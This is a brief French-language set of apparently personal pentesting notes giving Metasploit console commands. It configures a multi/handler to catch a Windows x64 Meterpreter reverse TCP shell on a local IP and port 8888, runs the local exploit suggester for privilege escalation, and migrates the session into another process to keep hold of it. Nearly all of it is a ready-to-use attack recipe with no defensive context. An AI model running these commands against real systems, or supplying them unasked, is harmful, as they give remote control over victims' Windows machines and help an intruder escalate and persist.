Handler :

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.8.142
set LPORT 8888
set ExitOnSession false
exploit -j -z
```

use post/multi/recon/local_exploit_suggester</br>

`run post/windows/manage/migrate` pour changer sur un processus plus fiable</br>
